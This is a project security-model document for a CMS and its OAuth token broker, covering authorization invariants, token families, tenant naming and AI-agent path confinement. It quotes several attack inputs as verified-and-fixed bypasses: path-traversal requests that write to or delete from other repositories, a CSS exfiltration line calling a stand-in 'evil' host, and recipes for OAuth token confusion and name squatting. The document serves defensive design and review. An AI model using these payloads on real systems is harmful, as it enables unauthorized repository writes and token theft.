# Security model

The auth/authz rules the tenant site and the broker both depend on, and why each
exists. Written after the 2026-07-25 review, which found four ways to bypass the
`/admin` gate, and extended after the 2026-07-26 sweep, which found five more —
every rule below is here because something got through.

Companion docs: `keys-and-secrets.md` (every credential and who holds it),
`onboarding-workflow.md` (life of an onboarding), `onboarding-broker-design.md`
(why/decisions), `mcp-server.md` (the agent surface). **This file is authoritative
where they disagree.**

> **Mid-migration, since 2026-08-09 (phase 2 of `security-todo.md` §10.8).** The
> `/admin` gate now accepts **two** credential families: the broker-signed RS256
> session described throughout this file, and a GitHub user token obtained by device
> flow with no secret anywhere. Everything below still describes the first family
> accurately — nothing was removed. For the second, GitHub answers both halves of I1
> instead of the config lists: identity is `GET /user`, authorization is
> `GET /repos/{owner}/{repo}` → `permissions` (`functions/_lib/gh-identity.ts`),
> cached 60s. The rest of the model — the allowlist, repo confinement, the editor
> write rules, I1–I5 — is unchanged and applies to both. This file is rewritten in
> phase 7, once the first family is deleted.

---

## 1. The five invariants

### I1 — A valid signature is not authorization

The broker mints a session for **anyone** who authenticates with GitHub; that is
what makes onboarding self-serve. So `verifySession()` returning a login means
only "GitHub says this is who they are". Whether that person may touch *this*
site is a second, separate check: `isAllowedLogin(login, ADMIN_LOGIN || repo.adminLogin)`.

Every gate that admits a session must make both checks. Currently:

| Gate | File | Identity | Ownership |
|---|---|---|---|
| `/admin/*` (SPA + both proxies) | `functions/admin/_middleware.ts` | ✅ | ✅ |
| Login handoff | `functions/admin/api/auth/handoff.ts` | ✅ | ✅ |
| MCP | `functions/api/mcp.ts` | ✅ | ✅ |

`functions/admin/api/cf/[[path]].ts` performs **no session check of its own** — it
trusts the middleware completely and then attaches an account-scoped Cloudflare
API token. Anything that weakens the middleware hands out that token. Do not add
a route under `/admin/` that bypasses it.

> The review found the middleware checking identity only. Any GitHub user could
> log in and reach `/admin/api/cf/*`.

### I2 — A denial is not an outage

`/admin/api/gh/*` asks the broker to mint a repo-scoped token and falls back to a
standing `GITHUB_TOKEN` PAT when the broker cannot answer. That fallback must
never trigger on a **refusal**: a caller the broker just rejected would be handed
broader credentials than the ones it was denied.

`brokerToken()` returns a three-state result — `{token}` / `"denied"` / `null`.
Only `null` (network error, 5xx, malformed response) may fall through to the PAT.
401 and 403 are terminal.

### I3 — Validate the URL you are about to fetch, not the string you were given

A path allowlist inspects a string; what actually leaves the Worker is a **parsed
URL**, and only the parser decides what a path segment means. They disagree in
ways that are not obvious:

- WHATWG URL treats `\` as a path separator, so `..\..\x` traverses.
- `%2e%2e` **is** a dot segment per RFC 3986 and normalizes on parse.
- `encodeURIComponent` does not escape `.`, so encoding a path does not neutralize `..`.

Both GitHub clients therefore validate twice:

| | String check | Resolved check |
|---|---|---|
| `functions/_lib/gh-proxy.ts` | `isAllowed()` — folds `\` and repeated percent-decoding before the dot-segment test | `upstreamTargetAllowed()` — the parsed URL must stay under `/repos/<owner>/<name>/` or be `/user` |
| `functions/_lib/lanza-content.ts` | `assertSafePath()` — rejects `..`, `.`, leading `/`, `\`, `%`, NUL, empty segments, `.git` | (paths are repo-relative by construction) |

> Verified bypasses, all now blocked and covered by tests:
> `PUT contents/..\..\..\..\repos/attacker/evil/contents/pwn.md` → wrote to another repo.
> `DELETE contents/%2e%2e/…/git/refs/heads/main` → deleted the branch Astro builds from.

### I4 — An audience claim is worthless unless every consumer checks it

A session's `aud` scopes it to one site. The tenant checks it
(`session.ts:verifySession`), and the MCP route checks a stricter form
(`aud === <origin>/api/mcp`, RFC 8707).

The broker's `/api/token` is a **second consumer** and must check it too. Without
that, a session minted for *any* origin mints `Contents:write` on *every* repo its
login owns — because ownership (`owner === login`) was the only test.

`audienceAllowedForRepo()` (`lanza-broker/functions/_lib/tenant-origin.ts`) binds
the audience to the repo by recomputing the tenant's origin. No new state — see
§2 for how the name is derived. Custom domains can't be derived; see §4.

> This is why design §3.3's "no origin allowlist is needed" argument does not
> hold. It assumed tenants were the only consumer of a broker-signed token.

**The multi-site MCP token is the one deliberate exception, and it does not weaken
this.** `connect.lanzacms.com/api/mcp` issues a token whose `aud` is the *router*, so
audience alone can no longer name one site. The bound moves to an explicit **`sites`
claim** the user sets at consent, and the router checks it on every call before minting
anything. Two properties keep I4 intact:

- The router mints its own **per-site** downstream tokens (`aud = <tenant>/api/mcp`,
  5 min). `/api/token` still sees only single-site audiences — `audienceAllowedForRepo`
  was not relaxed, and must not be.
- The exception is not transitive. A router-audience token is refused by every tenant,
  and a tenant-audience token is refused by the router. Neither substitutes for the other.

A `sites` claim is a *grant*, not a hint: absent or empty means **nothing**, never
everything (`lanza-broker/functions/api/mcp.ts`). The consent POST is intersected with
the server's own list, so the browser can only narrow it; refresh carries it unchanged.

### I5 — One key signs two token families; a signature does not say which

`HANDOFF_PRIVATE_KEY` signs **both** the 7-day CMS session (`/api/auth/callback`) and
the 1-hour MCP access token (`/api/oauth/token`). They are not interchangeable — the
session opens `/admin`, the GitHub proxy and the Cloudflare token — so every consumer
must establish *which one it is holding*, not merely that the broker signed it.

I4 alone does not do this, because **the MCP token's audience is chosen by the client
requesting it**. `resource` arrives as a query parameter. Ask for the tenant's bare
origin instead of its `/api/mcp` endpoint and the resulting token carries the same
`login`, the same `aud` and the same signature as that site's session cookie — so it
*is* that site's session cookie:

> **Verified, now blocked.** Register a client (registration is open by design), send
> the site owner an `/authorize` link with `resource=https://<their-site>`, and one
> click returns a working `lanza_session` for their site to an attacker-chosen
> `redirect_uri`. GitHub does not re-prompt a user who has already authorized the App
> — which every tenant has, since that is how they log in.

Three locks, because the fleet runs pinned versions and only the first protects a
tenant that has not updated:

1. **`authorize.ts` pins `resource` to an MCP endpoint** (`isMcpResource`, path must be
   exactly `/api/mcp`). Both well-known documents advertise only that, so no legitimate
   client is affected. This is the load-bearing fix — it is server-side and immediate.
2. **Both families are labelled** — `typ: "session"` and `typ: "mcp"`.
3. **Consumers check the label.** The tenant's `verifySession` takes a `family`
   argument (`session` for `/admin`, `mcp` for `/api/mcp`); the broker's `/api/token`
   pins each family to the audience *shape* it must have — a session names a bare
   origin, an MCP token names `…/api/mcp`.

A missing `typ` is accepted and a wrong one refused, so tokens minted before the claim
existed keep working and nobody is signed out.

**`/api/token` accepts both families on purpose.** The tenant's `/api/mcp` route mints
its GitHub token by forwarding the agent's own access token here, so refusing the MCP
family would break every agent write. The consequence is explicit and accepted: **an
MCP access token can be redeemed at `/api/token` for a `Contents:write` installation
token**, which is broader than the MCP tools' own path confinement (§3). What keeps
that bounded is that the token is hard to obtain — hence the consent screen below — not
that the confinement holds against its holder. Do not read `assertEntryPath` as a
guarantee against a *stolen token*; it is a guard against a *steered agent*.

**Registration is open, so consent cannot be skipped.** DCR needs no credentials and
CIMD needs no registration at all, so "which client is this" can never be inferred —
only shown and confirmed. Both MCP flows now render a consent screen before any code is
minted, naming the client *and* its redirect target (a name can lie; the redirect
origin is where the token actually goes). The single-site flow previously minted
silently on the reasoning that "identity is the whole consent" — true of the
user↔GitHub leg, but GitHub's screen names `lanza-cms`, never the requesting client.

**The GitHub `state` is a KV key, not a secret.** Anyone may call `/authorize` and read
it out of the 302. A second value is now set as an HttpOnly cookie
(`lanza_oauth_bind`) and required at the callback, so the browser that finishes a flow
must be the one that started it. Without it, an attacker harvests a `state`, lures the
victim through GitHub carrying it, and the code minted for the **victim's** identity is
bound to the **attacker's** client and PKCE challenge. PKCE does not help: it binds the
code to the client, and there the attacker *is* the client. The two other OAuth entry
points in the broker (`onboard/oauth/start.ts`, `auth/cf/login.ts`) always did this;
the MCP authorization server was the one that did not.

---

## 2. How a tenant's Pages project is named

`lanza-broker/functions/_lib/tenant-origin.ts` — read this before changing
anything about project naming, because two unrelated requirements meet in it.

**The name is not the repo name, and the user does not choose it.**

```
projectNameCandidates(owner, repo)[0] = `${slug(repo)}-${sha256(owner/repo)[0..12]}`

  datadefine/test    →  test-0304ea543eaf.pages.dev
  someone/test       →  test-f3d658bc73b5.pages.dev   (same repo name, no collision)
  acme/"My Bakery!"  →  my-bakery-ccb492ff422f.pages.dev
```

Two constraints force this shape:

1. **`*.pages.dev` is a global namespace** — unique across *every* Cloudflare
   account, not just the user's. Naming a project after its repo meant ordinary
   names (`test`, `blog`, `bakery`) collided with strangers on the first attempt.
   Worse, the collision was invisible: `projectExists` only checks *our* account,
   so a stranger's name read as "already exists → success", deployed nothing, and
   the wizard then invited the user to log in at a third party's `/admin`.
2. **The origin must be recomputable** (I4). `/api/token` has to derive a repo's
   site origin to check a session's `aud` against it. A random name would break
   that and force a persistent repo→origin store — reopening exactly the
   statelessness question §3 of the broker design just closed.

A 48-bit suffix bound to `owner/repo` satisfies both: collisions aren't a
practical concern, nobody can squat another tenant's name, and every name stays
derivable from public inputs.

**The fallback ladder is for creating, never for authorizing.**
`projectNameCandidates` returns `[base, base-2, base-3, base-4]`. Only Cloudflare can
say whether a name is genuinely free, so `deploy.ts` must be able to try again; in
practice the first candidate always wins.

`allowedOriginsForRepo` used to accept *every* candidate, on the reasoning that the set
is derived from one repo and so "grants nothing to any other tenant". That is true of
tenants and false of everyone else — the set includes three names **no tenant holds**,
in a namespace **anyone can register in**:

> **Verified, now blocked.** `base` is a pure function of public inputs, so an attacker
> computes a victim's `base-2`, creates a Pages project of that name in their *own*
> Cloudflare account, serves a handoff endpoint there, and runs the login flow naming
> that origin. `/api/auth/callback` signs `aud` for whatever origin the flow names, so
> they receive a 7-day session that `audienceAllowedForRepo` then accepted **for the
> victim's repo**. Squatting `base` itself also *forces* a later deploy onto `base-2`.

It now returns **only the first candidate**. A tenant that genuinely landed on a
fallback declares it in its own repo's `lanza.config.json` `domains` — the per-repo
mechanism custom domains already use, read from the repo the caller has proved it owns,
so it cannot widen anyone else's access.

**Constraints to respect if you touch this:** Cloudflare Pages names are
lowercase alphanumerics and hyphens, 58 chars max, start and end alphanumeric.
The base slug is capped at 42 so `base + "-" + 12 hex + "-4"` stays inside 58.
`deploy.ts` and `token.ts` must always agree — they import the same function, and
they must keep doing so.

## 3. What the MCP server may touch

The MCP tools run on behalf of an **agent**, which may be acting on
prompt-injected input. They are confined twice:

1. `assertSafePath()` — structural (I3 above). Applies to every path reaching the
   Contents API, including `data/site.json` and `data/schema.json` reads.
2. `assertEntryPath()` (`mcp-core.ts`) — the entry tools (`read`/`update`/`delete`)
   additionally require a `.md` file inside a folder some collection in
   `data/schema.json` actually declares.

`locale` is untrusted input, not a label: it is interpolated into a write path, so
`resolveLocale()` requires it to be a locale the site declares in `data/site.json`.

**`data/schema.json` is not a security boundary, and must not become one.**
`create_content` does not call `assertEntryPath` — it *builds* its path from the
collection's `folder` rather than checking one, so the only guard on it was
`assertSafePath`'s structural test. A collection declaring `folder:
"frontend/pages"` or `".github/workflows"` therefore turned "create an entry" into
"write a file there", and that file is writable through `/admin/api/gh` and the CMS
content-type editor. `getCollections()` now drops any collection whose folder is not
under `content/`. Dropping rather than throwing is deliberate: a hostile entry makes
that one collection invisible (every tool resolves by name and 404s) instead of
disabling the whole site.

> The forced `.md` suffix is what kept this from being worse — `.github/workflows/x.md`
> is inert because Actions needs `.yml`. Do not rely on that; it is a coincidence of
> the filename, not a confinement.

Why both: without confinement, "update an entry" is whole-repo write. In range
would be `lanza.config.json` (which decides who owns `/admin`),
`.github/workflows/*` (arbitrary code in the tenant's CI, reachable by staging a
workflow then calling `publish`), and `astro.config.mjs`.

`create_content` refuses to overwrite an existing path — it is a create, not an
upsert. Two titles that slugify alike would otherwise destroy an entry silently.

---

## 4. Deployment requirements this model imposes

| Setting | Where | Why | Consequence if unset |
|---|---|---|---|
| `ALLOWED_TENANT_ORIGINS` | broker | I4 — lists custom tenant domains that can't be derived from a repo name | **A custom-domain tenant cannot save.** `/api/token` returns 403 because the derived origin doesn't match. Comma-separated; **scope each entry to its repo** as `owner/repo=https://origin`. |
| `HANDOFF_PUBLIC_KEY` | broker | `/api/token` verifies tenant sessions with it | First save fails with a 500 that points at the tenant, not the broker |
| `ADMIN_LOGIN` (optional) | tenant | Overrides `lanza.config.json`'s `adminLogin`; comma-list for extra editors | Falls back to the committed config — fine for a normal tenant |

**lanzacms.com specifically** (the Lanza instance we run our own site on): its
repo is `dsottimano/lanza`, so the derived origin is
`https://lanza-76cae1b6cc54.pages.dev` — not the domain it actually serves from.
The broker must carry an entry for it or saves from that site break.

**Scope the entry to its repo.** An unscoped `https://lanzacms.com` is applied when
checking *every* repo, so any session for that origin satisfies the audience check for
every repo its login owns — restoring exactly the state I4 exists to prevent. The
bare form still parses, for compatibility; it should not be used.

```
ALLOWED_TENANT_ORIGINS=dsottimano/lanza=https://lanzacms.com
```

Any tenant on a custom domain needs the same entry — or, better, declares it in their
own repo's `lanza.config.json` `domains`, which needs no broker configuration at all
and cannot affect anyone else. That is the one thing §2's derivation cannot cover,
because a custom domain is not a function of the repo.

---

## 5. Known-accepted risks

Real, reviewed, not currently fixed. Listed so they are decisions rather than
oversights.

- **Refresh tokens are 30-day bearers with no reuse detection.** Rotation is
  single-use (a replay 400s), but nothing invalidates the live chain when a replay is
  seen, so a thief and the legitimate client race silently rather than the theft being
  detected. Reduced from 90 days on 2026-07-26; binding to `client_id` shipped at the
  same time, so a leaked token is at least useless to a different client.
- **Sessions cannot be revoked.** The session is a stateless 7-day RS256 bearer
  with no `jti` and no server-side state. Logout clears the cookie only; a
  captured token stays valid for its full life, and removing a login from
  `ADMIN_LOGIN` does not invalidate outstanding sessions. The only kill switch is
  rotating `HANDOFF_PRIVATE_KEY`, which signs every tenant out at once. Design
  §3.2's "Replay-bounded — `exp ≤ 120s` + one-shot `jti`" describes a system that
  was never built; §3.4-B superseded it by making the handoff token *become* the
  session.
- **The handoff token is the session token.** One artifact serves as both
  transport credential and session credential, so anything that observes the
  handoff once holds a 7-day session.
- ~~**Proxy responses relay upstream headers.**~~ **Fixed 2026-07-26.**
  `cache-control` and the `access-control-*` family are now stripped, and both proxies
  set `Cache-Control: no-store` themselves. CLAUDE.md Rule 2's "never cached" is
  enforced rather than inherited from whatever GitHub happened to send.
- **A Cloudflare access token passes through the browser during onboarding.**
  `lanza_cf` holds it as unauthenticated base64 JSON (`HttpOnly; Secure; Path=/`,
  `Max-Age=3600`). Reduced 2026-07-25 and **accepted as-is**: the cookie no longer
  carries a refresh token (`offline_access` is not requested), so the credential
  is bounded by the cookie's own hour. The wizard genuinely needs `page.write` in
  the browser's flow to create the Pages project, so the cookie cannot be removed
  outright.

  **Option B is closed — deliberately not built.** A per-tenant server-side token
  store would have made the broker custodian of every tenant's CF refresh token:
  one namespace, `page.write` on the entire fleet, blast radius all tenants
  instead of one. The store-nothing variant (mint a scoped API token per tenant at
  onboarding) was **verified impossible** — Cloudflare's OAuth vocabulary carries
  371 scopes and none grant API-token management, and `GET /user/tokens` on an
  OAuth token is `403 code 9109`. Instead, Cloudflare provisioning in the CMS is
  **opt-in**: the tenant creates their own token and sets it on their own Pages
  project. See `keys-and-secrets.md`.

  Scopes are now `account-settings.read`, `user-details.read`, `page.read`,
  `page.write` — four, each with a caller. `workers-kv-storage.write`, `d1.write`
  and `workers-r2.write` were removed; no broker code path ever used them. The
  tenant CMS *does* provision KV/D1/R2, but on the tenant's own token via
  `functions/_lib/cf-proxy.ts`, never on this grant.
- **A `<style>` ELEMENT with a placeholder is a CSS context the engine treats as
  text.** `style="…"` attributes are refused outright, but `<style>.a{color:{{c}}}</style>`
  only gets HTML escaping — enough to stop a `</style>` breakout (entities are literal
  in a raw-text element, verified) but not to stop `background:url(https://evil/?leak)`
  exfiltrating via an attribute selector. No shipped template has this shape. Fix if
  templates ever legitimately need one.
- **The public site has no full CSP and no `frame-ancestors`.** `public/_headers` sets
  `nosniff`, `Referrer-Policy`, `object-src 'none'` and `base-uri 'none'` only. This is
  a decision, not an oversight: a customer's public site may legitimately be embedded,
  and a `script-src` would have to account for whatever a tenant's own theme loads.
  Post bodies are sanitized (`frontend/lib/sanitize.ts`), which is the actual control.
  `/admin` is the origin that matters and it has a real CSP — note `_headers` does NOT
  apply to Pages Function responses, so the CMS policy lives in `_lib/admin-gate.ts`.
- **`/api/auth/cf/login` honours an unauthenticated `?scope=` override.** Re-checked
  2026-07-26: not an escalation. The extra scopes still face Cloudflare's own consent
  screen, the token lands only in the HttpOnly `lanza_cf` cookie on the broker origin,
  and no broker code path uses a scope beyond the four defaults. The real cost is
  consent-phishing optics — a Lanza-branded consent for permissions Lanza never uses.
- **No `Origin` validation on the MCP transport.** The spec asks for it against
  DNS rebinding; impact is low because auth is Bearer, not cookie.
- **An MCP access token can be redeemed at `/api/token` for `Contents:write`** — see
  I5. Deliberate: the tenant's MCP route mints its GitHub token by forwarding the
  agent's own token, so this cannot be refused without breaking agent writes. It means
  the MCP path confinement in §3 does not bind a token's *holder*, only a steered
  agent. Note GitHub itself refuses `.github/workflows/*` writes to an App token
  without the `workflows` permission, which the broker never requests — **verify this
  holds before relying on it.**
- **`auth/callback.ts` still signs `aud` for whatever origin the login flow names.**
  Design §3.3 accepts this because the receiving tenant checks `adminLogin`. The
  squatting attack in §2 showed the gap: the *attacker* can be the receiver. Closed at
  the consumer (`allowedOriginsForRepo` no longer blesses unclaimed names) rather than
  at the signer, so a forged origin now yields a session that is useless everywhere.
  Restricting what the broker will sign remains owed.

---

## 6. Reviewing changes to this surface

- Adding a route under `/admin/`? It inherits the middleware — confirm it should.
- Adding a GitHub call? Use an existing client. A third one means a third place
  I3 can be forgotten — and it was: `lanza-broker/functions/_lib/gh-app.ts` interpolated
  a request-supplied `repo` into `api.github.com` paths with no validation, so
  `x/../../victim/secret` resolved into another tenant's repo with the App JWT attached.
  Names are now checked against GitHub's own grammar (`isValidOwner`/`isValidRepo`) at
  the client *and* at `/api/token`.
- Accepting a token? Say which **family** you expect (I5). `verifySession` defaults to
  `session`; the MCP surfaces must ask for `mcp`. A signature is not an answer.
- Adding an origin to an authorization decision? It must be one a tenant demonstrably
  **holds**. Derived-but-unclaimed names are squattable (§2).
- **`frontend/lib/template-render.ts` has a build-time backstop, and that is the
  control you should actually rely on.** `frontend/lib/assert-rendered-safe.ts` parses
  the RENDERED output with parse5 — the same tokenizer a browser uses — and fails the
  build if a VALUE produced a live URL scheme, an `on*` handler, `srcdoc`, `<base
  href>`, a meta refresh or script/style text. It renders twice (once with the real
  data, once with every value replaced by an inert token) and reports only the
  difference, so author markup like `<button onclick="doThing()">` is never flagged —
  a false positive here would fail a tenant's deploy.
  It exists because the engine's position classifier was wrong five times in five
  review rounds, always the same way, and "we fixed the last one" is not evidence there
  is no next one. **This check does not depend on the engine being correct**, which is
  the whole point. Verified by reverting a real engine guard: the engine emitted live
  `javascript:` and the build failed. Build-time only — the CMS preview imports the
  engine in the browser, so parse5 must not enter that bundle (asserted).
- Touching `frontend/lib/template-render.ts`? Its safety depends on knowing WHERE a
  placeholder sits, and **every** bug it has had was a misclassification, not a bad
  escape. Three separate attempts to answer "am I inside a tag?" by looking BACKWARDS
  through preceding text were each bypassable, because a quoted attribute value may
  legally contain `<` or `>`: `lastIndexOf("<") > lastIndexOf(">")` fell to `alt="a>b"`;
  seeking to the last `<` fell to `alt="a<b>c"`; and a fixed-size window dropped the
  opening `<` behind a long attribute and failed **open**. It is now a forward state
  machine (`Ctx`) advanced one character at a time — do not replace it with a lookback.
  It also has to skip what is NOT markup: a `"` or `'` inside a comment, `<script>`,
  `<style>` or `<title>` used to open an attribute value that never closed, so the next
  real `href` was swallowed and never checked (`<!-- don't -->` was enough). Comments
  end at `-->`, not the first `>`; raw-text elements end at their close tag; a quote
  opens a value only directly after `=`.
  Other rules that are load-bearing rather than cosmetic: `/` separates attribute names
  (`<a/href=` is an href to a browser), a `{{#if}}` body is not a literal prefix
  (it renders to nothing when false), and `{{{raw}}}` is only "already-safe HTML" in a
  markup position — hence `Position.inTag`. An unknown position must fail closed.
  `functions/_lib/template-render.test.mjs` holds every payload; each test fails if its
  guard is reverted.
- Adding an MCP tool that takes a path or a path fragment? Route it through
  `assertEntryPath` (entries) or `assertSafePath` (anything else). Interpolating a
  tool argument into a path without one of those is the bug class that produced
  the CI-workflow write.
- Changing `isAllowed`, `assertSafePath`, or the audience binding? The adversarial
  cases live in `functions/_lib/gh-proxy.test.mjs` and `mcp-core.test.mjs`. They
  assert refusal **and** that nothing was written — keep both halves.
- Touching the OAuth authorization server? `lanza-broker/functions/api/oauth/
  oauth-flow.test.mjs` now covers the I5 cases: a non-MCP `resource`, a harvested
  `state` with no browser binding, a code redeemed by the wrong client, and the
  consent screen minting nothing until Allow is pressed. `tenant-origin.test.mjs`
  covers the squattable fallbacks and the repo-name grammar.
- Touching the multi-site MCP grant (the `sites` claim, the consent screen, the
  router)? Its adversarial cases live in `lanza-broker/functions/api/
  mcp-multisite.test.mjs` — a tampered consent POST, a broadening refresh, a replayed
  single-site token, an ungranted `site`. Each asserts refusal **and** that no request
  reached a tenant; keep both halves. If you find yourself relaxing
  `audienceAllowedForRepo` to make something work, stop — that is the check the router
  exists to avoid touching.
